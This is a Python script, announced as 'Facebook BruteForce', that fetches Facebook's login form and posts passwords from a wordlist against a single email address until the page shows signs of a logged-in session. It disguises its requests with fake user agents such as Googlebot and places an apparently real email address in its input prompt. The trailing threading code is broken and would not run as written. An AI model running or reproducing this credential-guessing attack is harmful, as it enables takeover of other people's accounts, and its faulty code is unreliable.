import threading
import os.path
import requests
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "jasu-wordlists"
MIN_PASSWORD_LENGTH = 6
MAX_PASSWORD_LENGTH = 20
POST_URL = 'https://www.facebook.com/login.php?login_attempt=1'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'User-Agent': 'Mozilla/5.0 (compatible; YandexAccessibilityBot/3.0; +http://yandex.com/bots)',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}

import re

def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies

import re

def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False

if __name__ == "__main__":
    print('\n---------- Welcome To Facebook BruteForce ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    email = input('angelpinkb@hotmail.com').strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
            
threads = []

for email, index, password in range(50):
   t = threading.Thread(target=is_this_a_password)
   t = threading.Thread(target=create_form)
   t.daemon = True
   threads.append(t)

for email, index, password in range(50):
        threads[i].start()

for email, index, password in range(50):
        threads[i].join()
        
